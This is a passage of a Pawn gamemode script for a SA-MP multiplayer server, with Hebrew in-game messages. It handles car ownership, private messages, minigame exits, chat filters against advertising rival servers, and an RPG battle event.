CreateStreamObject(2057,-1379.281,2110.274,42.381,0.0,0.0,-123.750,300);
info1=CreatePickup(1239,23, 2004.2324,1545.1237,13.5859);
info2=CreatePickup(1239,23, -1916.2875,296.3075,41.0469);
//======

    LoadProperties();
    MaximuxPlayer = GetMaxPlayers();
	for(new i; i<MaximuxPlayer; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        new pName[MAX_PLAYER_NAME];
			GetPlayerName(i, pName, MAX_PLAYER_NAME);
			for(new propid; propid < Propertiesamount; propid++)
			{
				if(PropInfo[propid][PropIsBought] == 1)
				{
				    if(strcmp(PropInfo[propid][PropOwner], pName, true)==0)
					{
					    EarningsForPlayer[i] += PropInfo[propid][PropEarning];
					    PlayerProps[i]++;
					}
				}
			}
		}
	}
    SetTimer("UpdateUnbuyableTime", 60000, 1);
	#if ENABLE_MAP_ICON_STREAMER == 1
	SetTimer("MapIconStreamer", 500, 1);
	#endif
	SetTimer("PropertyPayout",10*60*1000, 1);

//==




        if(!dini_Exists(OVERALLFILE))
        {
        dini_Create(OVERALLFILE);
        printf("[File Created]: %s", OVERALLFILE);
            dini_FloatSet(OVERALLFILE, "S1", 0.0000);
            dini_FloatSet(OVERALLFILE, "S2", 0.0000);
            dini_FloatSet(OVERALLFILE, "S3", 0.0000);
            dini_Set(OVERALLFILE, "N1", "Empty");
            dini_Set(OVERALLFILE, "N2", "Empty");
            dini_Set(OVERALLFILE, "N3", "Empty");
        }
        if(!dini_Exists(PERSONALFILE))
        {
        dini_Create(PERSONALFILE);
        printf("[File Created]: %s", PERSONALFILE);
        }
        HS[0] = dini_Float(OVERALLFILE, "S1");
        HS[1] = dini_Float(OVERALLFILE, "S2");
        HS[2] = dini_Float(OVERALLFILE, "S3");
        format(HSN[0], MAX_PLAYER_NAME, "%s", dini_Get(OVERALLFILE, "N1"));
        format(HSN[1], MAX_PLAYER_NAME, "%s", dini_Get(OVERALLFILE, "N2"));
        format(HSN[2], MAX_PLAYER_NAME, "%s", dini_Get(OVERALLFILE, "N3"));
//=[TD]=================================================================
//=[LoadConfig]=========================================================
CreateLoadConfig();
	

//--
//New

//=[Cartem`s]=======================================================
if(!fexist("Car/"))
{
print(">		WARNING:\n");
print(" The  ' Car '   folder is missing from scriptfiles");
print("\n Please Create This Folder And Start the Filterscript Again\n");
return 1;
}

return 1;
}




public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{

if(GetPlayerVehicleID(playerid) >= VCount) return false;
format(file,sizeof(file),"Car/car%d.ini",GetPlayerVehicleID(playerid));
new msg[256]; new PlayerName[100]; GetPlayerName(playerid,PlayerName,30);
if(VehicleInfo[vehicleid][CarOwned] == 1)
{
if(strcmp(PlayerName,VehicleInfo[vehicleid][CarOwner],true) == 0)
{
format(msg,sizeof(msg),"!%s ,שלך %s ברוך הבא לרכב ה",VehicleInfo[vehicleid][CarOwner],VehicleInfo[vehicleid][CarName]);
SendClientMessage(playerid,ORANGE,msg);
if(VehicleInfo[vehicleid][SaleV] > 0)
{
SendClientMessage(playerid,COLOR_YELLOW,"/StopSale :הרכב שלך, עדיין מוצע לקניה, על מנת להפסיק את מכירת הרכב בצע/י");
}
}
else if(strcmp(PlayerName,VehicleInfo[vehicleid][CarOwner],true) == 1)
{


if(VehicleInfo[vehicleid][SaleV] != 0)
{
format(msg,sizeof(msg),".%s :מהבעלים %s :הצעה רכב זה מסוג *",VehicleInfo[vehicleid][CarOwner],VehicleInfo[vehicleid][CarName]);
SendClientMessage(playerid,lblue,msg);
format(msg,sizeof(msg),".$%d הציע את הרכב שלו לציבור במחיר של כ",VehicleInfo[vehicleid][SaleV]);
SendClientMessage(playerid,lblue,msg);
SendClientMessage(playerid,lblue,"/BuyCar :על מנת לקנות תרכב מבעל הרכב בצע/י ");
}
else
{

format(msg,sizeof(msg),".ולכן לא ניתן לקנייה %s רכב זה הינו בבעלות [%s]",VehicleInfo[vehicleid][CarOwner],VehicleInfo[vehicleid][CarName]);
SendClientMessage(playerid,lblue,msg);
}
}
}
else if(VehicleInfo[vehicleid][Buyable] == 0)
{
format(msg,sizeof(msg),".הינו רכב ציבורי ,%s רכב זה",VehicleInfo[vehicleid][CarName]);
SendClientMessage(playerid,0xB3111EFF,msg);
}
else if(VehicleInfo[vehicleid][Buyable] == 1)
{
format(msg, 256, "[$%d] :רכב זה פנוי לרכישה במחיר [%s]", VehicleInfo[vehicleid][Price],VehicleInfo[vehicleid][CarName]);
SendClientMessage(playerid, lblue, msg);
format(msg, 256, "/Car :לפרטים הרכב, בצע/י || /BuyCar :לרכישת הרכב, בצע/י");
SendClientMessage(playerid, lblue, msg);
}






if(PlayerInfo[playerid][Pets] ==1)
{
if(PlayerInfo[playerid][Shark] ==1)
{
DestroyStreamObject(sam33[playerid]);
SharkYou[playerid] =0;
ThePetsInYou[playerid] =0;
}
if(PlayerInfo[playerid][Dolp] ==1)
{
DestroyStreamObject(sam22[playerid]);
ThePetsInYou[playerid] =0;
DolpYou[playerid] =0;
}
if(PlayerInfo[playerid][Tor] ==1)
{
DestroyStreamObject(sam44[playerid]);
ThePetsInYou[playerid] =0;
TorYou[playerid] =0;
}
}

/*
if (GetVehicleModel(vehicleid) == 519 && ispassenger)
{
if (!ShamalExists(vehicleid))
{
CreateShamalInt(vehicleid, float(randomEx(3000)), float(randomEx(3000)), float(random(100)+800));
}
SetPlayerPosInShamal(playerid, vehicleid);
InShamal[playerid] = vehicleid;
}
*/
return 1;
}


 
public OnPlayerPrivmsg(playerid, recieverid, text[])
{
if(!IsPlayerConnected(recieverid)) return SendClientMessage(playerid,WHITE,".שחקן/ינת לא מחובר/ת תבדוק עם האיידי שהקלדת נכון"),0;
if(recieverid == playerid) return SendClientMessage(playerid,WHITE,".את/ה לא יכול/ה לשלוח הודעה פרטית לעצמך"),0;
new strs[256];

if(!dini_Exists(GetPlayerFile(playerid)))
{
format(strs, sizeof(strs), "/register :על מנת להתחיל לשחק הירשם קודם");
SendClientMessage(playerid, red , strs);
return 0;
}
else if(dini_Exists(GetPlayerFile(playerid)) && PlayerInfo[playerid][Logged] == 0)
{
format(strs, sizeof(strs), "/login :על מנת להתחיל לשחק התחבר קודם");
SendClientMessage(playerid, red, strs);
return 0;
}



if(isafk[recieverid] == 1 && !IsPlayerXAdmin(playerid,1))
{
SendClientMessage(playerid,WHITE,".רוב הסיכויים שהוא לא יענה לך AFK שחקן זה נמצא");
}

if(Ignore[recieverid][playerid] == 1)return SendClientMessage(playerid,red,".שחקן זה ביטל את האפשרות שלך לשלוח לו הודעות פרטיות"),0;
if(cancelpm[recieverid] == 1 && !IsPlayerXAdmin(playerid,1)) return SendClientMessage(playerid,red,".שחקן זה חסם את האפשרות לשלוח לו הודעות פרטיות"),0;
if(antispam[playerid] >0 && !IsPlayerXAdmin(playerid,1)) return SendClientMessage(playerid,red,".הודעה פרטית אחת כל 2 שניות"),0;

antispam[playerid] ++;
if(isafk[playerid] == 1) return OnPlayerCommandText(playerid,"/unafk");


new str[256],str2[256];

format(str,sizeof(str),"PM: to - %s (%d) %s",GetName(recieverid),recieverid,text);
SendClientMessage(playerid,lblue,str);
format(str2,sizeof(str2),"PM: from - %s (%d): %s",GetName(playerid),playerid,text);
SendClientMessage(recieverid,COLOR_YELLOW,str2);

return 0;
}
forward SendClientMessageToAdmins(color,const string[]);
public SendClientMessageToAdmins(color,const string[])
{
        for(new i = 0; i < MAX_PLAYERS; i++)
        {
                if(IsPlayerConnected(i))
                {
                       if (IsPlayerXAdmin(i,1) && Spectatorl[i] == 1)

{
                                SendClientMessage(i, lblue, string);

                        }
                }
        }
        return 1;
}


forward SendClientMessageToAdminsC(color,const string[]);
public SendClientMessageToAdminsC(color,const string[])
{
        for(new i = 0; i < MAX_PLAYERS; i++)
        {
                if(IsPlayerConnected(i))
                {
                       if (IsPlayerXAdmin(i,1))
					   {

                                SendClientMessage(i, lblue, string);

                        }
                }
        }
        return 1;
}


forward CancelDrift(playerid);
public CancelDrift(playerid)
{
if(PrivateCP[playerid] == 0)
{
for(new Drifter=0; Drifter<MAX_PLAYERS; Drifter++)
{
driftwinner[Drifter]=0;
DriftInvite[Drifter] =0;
IfInvite[Drifter] =0;
DriftNoNow = 0;
TogglePlayerControllable(playerid, 1);
SendClientMessage(Drifter,COLOR_ORANGE,"/drift help מירוץ הדריפט התפנה, על מנת להזמין חבר/ה למירוץ דריפט אישי");
}
}
return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{



if(PChain[playerid] == 1)
{
ChaPlayers --; InCha[playerid] = 0; PChain[playerid] = 0;
}

if(RaceJumpKill == playerid)
{
EndJumpKill();
TogglePlayerControllable(RaceJumpKill, 1);
}

if(InDM[playerid] > 0)
{
OnPlayerCommandText(playerid,"/qdmz");
ResetPlayerWeapons(playerid);
SetPlayerHealth(playerid,0.0);
SetTimerEx("QDMZ",4*1000,0,"i",playerid);

}
if(Youregisterrace[playerid] ==1)
{
SetPlayerHealth(playerid,0.0);
Youregisterrace[playerid] =0;
RacePlayers--;
DisablePlayerRaceCheckpoint(playerid);
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);

}
if(YouRegister[playerid] ==1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
SetPlayerHealth(playerid,0.0);
YouRegister[playerid] =0;
DisablePlayerRaceCheckpoint(playerid);
DriftPlayer--;

}
if(Registertrs[playerid] ==1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
CPTriatlon[playerid]=0;
DisablePlayerRaceCheckpoint(playerid);
Registertrs[playerid] =0;
CPTriatlon[playerid]=0;
RunPlayers--;
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);

}
//END
if(KK[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");

SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
KartPlayers --;
InKart[playerid] = 0;
KK[playerid] = 0;
Fuck[playerid] = 0;
DestroyVehicle(caridxx[playerid]);


}

if(MonsterNoTeleportion[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
iNmOnster[playerid] = 0;
MonsterPlayers --;
iNmOnster[playerid] = 0;
MonsterNoTeleportion[playerid] = 0;
MonsterFucker[playerid] = 0;
DestroyVehicle(MonsterSYSTEM[playerid]);
MonStart[playerid] =0;

}

if(PGrein[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
GrePlayers --; InGre[playerid] = 0; PGrein[playerid] = 0;
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");

}

if(PPw[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
WarPlayersw --; InWarw[playerid] = 0; PPw[playerid] = 0;
SetPlayerVirtualWorld(playerid,0);

}
if(PP[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");
WarPlayers --;
InWar[playerid] = 0;
PP[playerid] = 0;

}
if(PPr[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
WarPlayersr --; InWarr[playerid] = 0; PPr[playerid] = 0;
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");

}
if(InBike[playerid] > 0)
{
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
BikePlayers --;
InBike[playerid] =0;
new vehicleidss = GetPlayerVehicleID(playerid);
SetVehicleVirtualWorld(vehicleidss,0);
}

RemovePlayerFromRaces(playerid);
RemovePlayerFromRaces2(playerid);
OutDrift(playerid);
return 1;
}



forward repairbug(playerid);
public repairbug(playerid) return SpawnPlayer(playerid);

public OnVehicleSpawn(vehicleid)
{



LinkVehicleToInterior(vehicleid,0);
return 1;
}
/*
public ExplodeShamal(vehicleid)
{
KillTimer(sExplode[vehicleid]);
if (tCount[vehicleid])
{
CreateExplosion(ShamalPos[vehicleid][0], ShamalPos[vehicleid][1], ShamalPos[vehicleid][2], 2, 15.0);
sExplode[vehicleid] = SetTimerEx("ExplodeShamal", random(1300)+100, 1, "d", vehicleid);
}
}
*/
//car
//==============================================================================


//==============================================================================

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys){
{


/*
if (newkeys & 16 && InShamal[playerid])
{
new Float:X, Float:Y, Float:Z, Float:A;
GetVehiclePos(InShamal[playerid], X, Y, Z);
GetVehicleZAngle(InShamal[playerid], A);
X += (5 * floatsin(-floatsub(A, 45.0), degrees)),
Y += (5 * floatcos(-floatsub(A, 45.0), degrees));
SetPlayerInterior(playerid, 0);
SetPlayerPos(playerid, X, Y, floatsub(Z, 0.94));
SetPlayerFacingAngle(playerid, A);
SetCameraBehindPlayer(playerid);
InShamal[playerid] = 0;
}
*/
if(IsKeyJustDown(KEY_FIRE,newkeys,oldkeys) || IsKeyJustDown(128,newkeys,oldkeys)){
if(GetPlayerInterior(playerid) == 4 || GetPlayerInterior(playerid) == 4){
SendClientMessage(playerid,red,".אין לתקוף או לאיים באיזור זה");
SetPlayerPos(playerid,1022.1641,-1133.3300,23.8281);
SetPlayerInterior(playerid,0);
}
}
if(IsKeyJustDown(KEY_FIRE,newkeys,oldkeys) || IsKeyJustDown(128,newkeys,oldkeys))
{
if(InArea(playerid,1985.0746,1858.3486,-1347.2802,-1464.8994))
{
if(IsPlayerInAnyVehicle(playerid)) return ResetPlayerWeapons(playerid),0;
ResetPlayerWeapons(playerid);
SendClientMessage(playerid,red,".אין לתקוף או לאיים באיזור זה");
if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
{
new vehicleid = GetPlayerVehicleID(playerid);
SetVehiclePos(vehicleid, 1874.7780, -1391.9210, 13.5482);
SetVehicleZAngle(vehicleid, 313.1693);
SetPlayerInterior(playerid, 0);
}
else
{
SetPlayerPos(playerid, 1874.7780, -1391.9210, 13.5482);
SetPlayerFacingAngle(playerid, 313.1693);
SetPlayerInterior(playerid, 0);
}
}
}
if(IsKeyJustDown(KEY_FIRE,newkeys,oldkeys) || IsKeyJustDown(128,newkeys,oldkeys)){
if(GetPlayerInterior(playerid) == 6 || GetPlayerInterior(playerid) == 1){
SendClientMessage(playerid,red,".אין לתקוף או לאיים באיזור זה");
SetPlayerPos(playerid,1424.9977,-2285.6335,13.3828);
SetPlayerInterior(playerid,0);
}
}
}
return 1;
}

IsKeyJustDown(key, newkeys, oldkeys)
{
if((newkeys & key) && !(oldkeys & key)) return 1;
return 0;
}










//-=-=


forward ShipBank(playerid);
public ShipBank(playerid)
{
new string[256];
new pcash[MAX_PLAYERS];
if(BankShipOn[playerid] == 0) return 0;
if(InAreaShip(playerid, 1995.5, 1518.0, 2006.0, 1569.0))
{
pcash[playerid] = GetPlayerMoney(playerid);
PlayerInfo[playerid][BSHIP]+=pcash[playerid];
ResetPlayerMoney(playerid);
pcash[playerid] =0;
format(string, sizeof(string),".%d-הכסף של הבנק ספינה שלך הוכפל ל", PlayerInfo[playerid][BSHIP]);
SendClientMessage(playerid, COLOR_ORANGE, string);
dini_IntSet(GetPlayerFile(playerid),"BSHIP",PlayerInfo[playerid][BSHIP]);
}
else
{
format(string, sizeof(string),">>.%d-הפסקת בהצלחה, קיבלת סכום של כ", PlayerInfo[playerid][BSHIP]-100);
SendClientMessage(playerid, COLOR_ORANGE, string);
BankShipOn[playerid] = 0;
LACY_GiveMoney(playerid, PlayerInfo[playerid][BSHIP]);
PlayerInfo[playerid][BSHIP]=0;
pcash[playerid] =0;
dini_IntSet(GetPlayerFile(playerid),"BSHIP",0);
}
return 1;
}
/*
forward rvip();
public rvip() {
for(new i = 0;i<MAX_PLAYERS;i++)
{
ThisIsSendMessage[i] =1;
}
return 1;
}
*/
forward rspam();
public rspam() {
for(new i = 0;i<MAX_PLAYERS;i++)
{
antispam[i] =0;
}
return 1;
}

forward Rfb();
public Rfb() {
for(new i = 0;i<MAX_PLAYERS;i++)
{
aDoing[i] = 0;
}
return 1;
}
forward Rpet();
public Rpet() {
for(new i = 0;i<MAX_PLAYERS;i++)
{
PetInWar[i]=0;
}
return 1;
}
forward Rhelp();
public Rhelp() {
for(new i = 0;i<MAX_PLAYERS;i++)
{
helpme[i] =0;
}
return 1;
}

forward Rcall();
public Rcall() {
for(new i = 0;i<MAX_PLAYERS;i++)
{
InCall[i] =0;
}
return 1;
}


public OnPlayerText(playerid, text[])
{
if(PlayerInfo[playerid][Logged] > 1) return 0;

//=[Anti] - 2


if(isafk[playerid] == 1) return OnPlayerCommandText(playerid,"/unafk");
if(antispam[playerid] >0 && !IsPlayerXAdmin(playerid,1)) return SendClientMessage(playerid,WHITE,".הודעה אחת כל 2 שניות"),0;
antispam[playerid] ++;
new str[256];

if(!dini_Exists(GetPlayerFile(playerid))) return format(str, sizeof(str), "/register :על מנת להתחיל לשחק הירשם קודם"), SendClientMessage(playerid, red , str),0;
if(dini_Exists(GetPlayerFile(playerid)) && PlayerInfo[playerid][Logged] == 0) return format(str, sizeof(str), "/login :על מנת להתחיל לשחק התחבר קודם"),SendClientMessage(playerid, red, str),0;

if(strfind(text, ".227", true)!=-1 ||
strfind(text, ":7003", true)!=-1 ||
strfind(text, ":5555", true)!=-1 ||
strfind(text, "145.", true)!=-1 ||
strfind(text, ":6666", true)!=-1 ||
strfind(text, "212", true)!=-1 ||
strfind(text, ":1111", true)!=-1 ||
strfind(text, ":7777", true)!=-1 ||
strfind(text, ":7002", true)!=-1 ||
strfind(text, "26.", true)!=-1 ||
strfind(text, ":8888", true)!=-1 ||
strfind(text, "7 7 7 7", true)!=-1 ||
strfind(text, ".254", true)!=-1 ||
strfind(text, "2007", true)!=-1 ||
strfind(text, "7777", true)!=-1 ||
strfind(text, "26.", true)!=-1 ||strfind(text, "8.", true)!=-1 ||
strfind(text, "234.", true)!=-1 || strfind(text, "6.", true)!=-1) {
format(str, sizeof(str), ".``%d`` מילה לא חוקית" , text);
SendClientMessage(playerid,red, str);

return 0;
}



if(Sagebir[playerid] ==1){
new string[256];
new year, month,day;
getdate(year, month, day);
new DateInfo[3][20];
split(text, DateInfo, '/');
if(year - strval(DateInfo[2]) > 100 || strval(DateInfo[2]) < 1 || strval(DateInfo[2]) >= year)
{
SendClientMessage(playerid,WHITE, "(Usage: dd/mm/yyyy) :תאריך לידה לא חוקי נסה ככה");
return 0;
}
new check = year - strval(DateInfo[2]);
if(check == year)
{
SendClientMessage(playerid,WHITE, "(Usage: dd/mm/yyyy) :תאריך לידה לא חוקי נסה ככה");
return 0;
}
if(strval(DateInfo[1]) > month)
{
check -= 1;
}
else if(strval(DateInfo[1]) == month && strval(DateInfo[0]) > day)
{
check -= 1;
}
PlayerInfo[playerid][AggInfo] = check;
format(string, sizeof(string), "[%d] אוקיי אז אתה בן",PlayerInfo[playerid][AggInfo]);
SendClientMessage(playerid, 0x0F482FF, string);
SendClientMessage(playerid,COLOR_ORANGE, ".כעת תוכל לדבר חופשי בצ'אט");
Sagebir[playerid] =0;
return 0;
}

GetPlayerName(playerid,playername, sizeof(playername));
if(text[0] == '@')
{
new file_clan[256];
format(file_clan,256,"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid,WHITE,"!אתה לא חבר בשום קלאן"),0;
if(ClanMute[playerid] > 0) return SendClientMessage(playerid,red,".אתה במיוט בקלאן צ'אט לא תוכל לדבר בקלאן צ'אט עד שיורידו לך"),0;



new st3[256];
format(st3,sizeof(st3),"@ %s(ID: %d | LVL: %d): %s",playername,playerid,dini_Int(GetPlayerFile(playerid), "ClanLvl"),text[1]);
for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true))
{
if(dini_Int(GetPlayerFile(i), "ClanLvl") > 0)
{
SendClientMessage(i,lblue,st3);
}
}
}
return 0;
}
if(text[0] == '^')
{
if (CellState[playerid]==ESTA_HABLANDO)
{
new msg[255];
new pName2[MAX_PLAYER_NAME];
GetPlayerName(playerid,pName2,sizeof(pName2));
format(msg,sizeof(msg),"(%s): %s",pName2,text);
SendClientMessageToAdmins(red,msg);
AlTelefono(AuxiliarTel[playerid],msg);
format(msg,sizeof(msg),"[Phone]: %s",text);
SendClientMessage(playerid,COLOR_YELLOW,msg);
}
return 0;
}


if(text[0] == '!')
{
if(playerGang[playerid] > 0)
{
new gangChat[256];
new senderName[MAX_PLAYER_NAME];
//for(new i = 1; i < strlen(text)+1; i++)
//gangChat[i]=text[i];
strmid(gangChat,text,1,strlen(text));
GetPlayerName(playerid, senderName, sizeof(senderName));
format(string, sizeof(string),"! [GANG CHAT] %s: %s", senderName, gangChat);
SendClientMessageToAdmins(red,string);
for(new i = 0; i < gangInfo[playerGang[playerid]][1]; i++)
{
SendClientMessage(gangMembers[playerGang[playerid]][i], lblue, string);
}
return 0;
}
return 0;
}
if ((text[0] != '!' && text[0] != '@') && strfind(text, "213.8.26.132:2007", true)!=-1 || strfind(text, "195.189.140.155:7007", true)!=-1 || strfind(text, "80.179.149.110:1234", true)!=-1 || strfind(text, "213.8.26.132:7003", true)!=-1 || strfind(text, "www.top-games.co.il", true)!=-1 || strfind(text, "213.8.26.132:5555", true)!=-1
|| strfind(text, "62.90.136.233:7777", true)!=-1 || strfind(text, "82.80.245.35:7777", true)!=-1 || strfind(text, "195.189.140.50:7002", true)!=-1){
spamkick[playerid] ++;
if(spamkick[playerid]  ==1) return SendClientMessage(playerid,WHITE,"BAN - קיבלת באן בגלל פרסום שרת"),0;
Ban(playerid);
//if(spamkick[playerid]  ==3) return SendClientMessage(playerid,WHITE,".קיבלת אזהרה 2/3 עוד פעם 1 תקבל קיק מהשרת"),0;
//if(spamkick[playerid]  ==2) return SendClientMessage(playerid,WHITE,"קיבלת אזהרה 1/3 עוד פעמיים תקבל קיק"),0;
//if(spamkick[playerid]  ==4) return SendClientMessage(playerid,WHITE,"קיבלת קיק מהשרת עקב תכנים לא חוקיים"),0,TogglePlayerControllable(playerid,0),Kick(playerid);
return 0;
}
if ((text[0] != '!' && text[0] != '@') && strfind(text, "VGames", true)!=-1 || strfind(text, "7 0 0 3", true)!=-1 || strfind(text, "6666", true)!=-1 || strfind(text, "7777", true)!=-1 || strfind(text, "/q", true)!=-1 || strfind(text, "8888", true)!=-1
|| strfind(text, "fxp", true)!=-1 || strfind(text, "7007", true)!=-1 || strfind(text, "2007", true)!=-1)
{
spamkick[playerid] ++;
if(spamkick[playerid]  ==1) return SendClientMessage(playerid,red,"Warning - קיבלת אזהרה על תוכן לא חוקי"),0;
if(spamkick[playerid]  ==3) return SendClientMessage(playerid,red,".קיבלת אזהרה 2/3 עוד פעם 1 תקבל קיק מהשרת"),0;
if(spamkick[playerid]  ==2) return SendClientMessage(playerid,red,"קיבלת אזהרה 1/3 עוד פעמיים תקבל קיק"),0;
if(spamkick[playerid]  ==4) return SendClientMessage(playerid,red,"קיבלת קיק מהשרת עקב תכנים לא חוקיים"),0,TogglePlayerControllable(playerid,0);

return 0;
}


/*
	if((!strfind(text,"צי'טר",true) || !strfind(text,"האקר",true) || !strfind(text,"hacker",true) ||  !strfind(text,"cheater",true) || !strfind(text,"ציטר",true)))
	{
	SendPlayerBotMessage(playerid,red,"Bot_Admin","/report :על מנת לדווח על צי'טר בצעו את הפקודה **",1);
	return false;
	}

*/
	new pAdded[256];
	{
	format(pAdded,sizeof(pAdded),"(ID: %d) %s",playerid,text);
	SendPlayerMessageToAll(playerid,pAdded);
	}
	/*
	if((!strfind(text,"אדמינים",true) || !strfind(text,"יש כאן אדמין",true) || !strfind(text,"אדמין",true)) && !bot_can_send_message)
	{
	SendPlayerBotMessage(playerid,red,"Bot_Admin","/admins :לעזרה פנו לאחד האדמין",1);
	bot_can_send_message = 1;
	return false;
	}
	
	else if((!strfind(text,"כתובת הטים ספיק",true) || !strfind(text,"שרת הדיבור",true) || !strfind(text,"טים ספיק",true)  ||  !strfind(text,"האייפי של השרת דיבור",true)) && !bot_can_send_message)
	{
	SendPlayerBotMessage(playerid,COLOR_LIGHTGREEN,"Help_Bot","80.179.149.52:4545 :הוא Team Speak של השרת IP ה",1);
    bot_can_send_message = 1;
	return false;
	}
	
	
	else if((!strfind(text,"איך משיגים כסף",true) || !strfind(text,"מי מביא לי כסף",true)) && !bot_can_send_message)
	{

	SendPlayerBotMessage(playerid,COLOR_GREEN,"Bot_Bids","/moneyhelp :על מנת להשיג כסף בצע את הפקודה",1);
	bot_can_send_message = 1;
	return false;
	}
	
	
	else if((!strfind(text,"מה הפורום",true) || !strfind(text,"כתובת הפורום",true) || !strfind(text,"הפורום שלנו מה הכתובת",true)) && !bot_can_send_message)
	{
	SendPlayerBotMessage(playerid,COLOR_YELLOW,"Bot_Web","Satla-Zone.co.il :כתובת הפורום של השרת שלנו",1);
	bot_can_send_message = 1;
	return false;
	}
	
	else if((!strfind(text,"אני צריך עזרה",true) || !strfind(text,"אפשר עזרה",true) || !strfind(text,"עזרה בבקשה",true)) && !bot_can_send_message)
	{
	SendPlayerBotMessage(playerid,lblue,"Supportives_Bot","/HelpMe :לקבלת עזרה בשרת",1);
	bot_can_send_message = 1;
	return false;
	}
*/
	return false;
	}







forward WarStartr();
public WarStartr()
{
new string[256];
SendClientMessageToAll(WHITE,"[_____________גאטר - בזוקות מאורגן_____________]");
SendClientMessageToAll(COLOR_YELLOW, "! נפתחה הרשמה לקרב מאורגן, הזדרזו להירשם");
format(string,sizeof(string),".$10,000 :פרס למנצח מתחיל מסכום של");
SendClientMessageToAll(COLOR_YELLOW,string);
SendClientMessageToAll(0x0F6A0FF, "/Rpg :יש לכם 60 שניות להצטרף, להצטרפות רשמו");
SendClientMessageToAll(WHITE,".---------------------------------");
WarOnr = 1; WarPlayersr = 0;
Countr = 60; Countdownr(); CountFucr = 1;
return 1;
}

//==================================Countdown===================================
forward Countdownr();
public Countdownr()
{
new string[256];
if(Countr == 25)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /Rpg.",WarPlayersr);
SendClientMessageToAll(COLOR_WHITE,string);
}
else if(Countr == 10)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /Rpg.",WarPlayersr);
SendClientMessageToAll(COLOR_WHITE,string);
}
new String[256];
format(String, 256,"~W~%d",Countr);
GameTextForAll(String,1000,6);
if(Countr > 0)
{
--Countr;
SetTimer("Countdownr", 1000, 0);
}
else
{
if(CountFucr == 1)
{
TeleportPlayerToWarr();
if(knoobr == 1)
{
Countr = 10; Countdownr(); CountFucr = 2;
}
}
if(CountFucr == 2 && Countr <= 0) {
Unfreezer();
}
}
}
//==================================Unfreeze====================================
forward Unfreezer();
public Unfreezer()
{
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(PPr[i] == 1)
{
TogglePlayerControllable(i, 1);
SetCameraBehindPlayer(i);
GameTextForAll("~W~ Lets Rpg", 3000, 1);
}
}
}
//=============================TeleportPlayerToWar==============================
forward TeleportPlayerToWarr();
public TeleportPlayerToWarr()
{
if(WarPlayersr < MinWarPlayersr)
{
WarEndr(0);
return 1;
}
new string[256];
SendClientMessageToAll(WHITE,"[______________!גאטר בזוקות - החל______________]");
format(string,sizeof(string)," %d :מס' משתתפים",WarPlayersr),SendClientMessageToAll(0xE21E1EFF,string);
format(string,sizeof(string)," $10,000 :סכום זכייה שנקבע על ידי השחקנים הוא"),SendClientMessageToAll(0xE21E1EFF,string);
SendClientMessageToAll(WHITE,".--------------------------------------");
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InWarr[i] == 1) {

new rand = random(sizeof(gRandomWarSpawns));
SetPlayerPos(i, gRandomWarSpawns[rand][0], gRandomWarSpawns[rand][1], gRandomWarSpawns[rand][2]);
//editprofilelayerInterior(i, 10);
ResetPlayerWeapons(i);
SetPlayerVirtualWorld(i,10);

KillTimer(AntiOff);
ResetPlayerWeapons(i);
rand = random(sizeof(WarWeaponsr));
GivePlayerWeapon(i,WarWeaponsr[rand],5000);
SetPlayerHealth(i, 100.0);
WSr = 1; PPr[i] = 1; knoobr = 1;
TogglePlayerControllable(i, 0);
CheckTimer = SetTimer("Checkr",1000, 1);
}
}
return 1;
}


forward WarEndr(statusr);
public WarEndr(statusr)
{
if(statusr == 0)
{
SendClientMessageToAll(red, ".הגאטר בוטל בגלל חוסר שחקנים שהיה פחות מ-3");
SendClientMessageToAll(red, ".כל שחקן שהצטרף קיבל פיצוי בסך 500 דולר");


WarOnr = 0; WarPlayersr = 0;
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(PPr[i] == 1)
{
ResetPlayerWeapons(i);
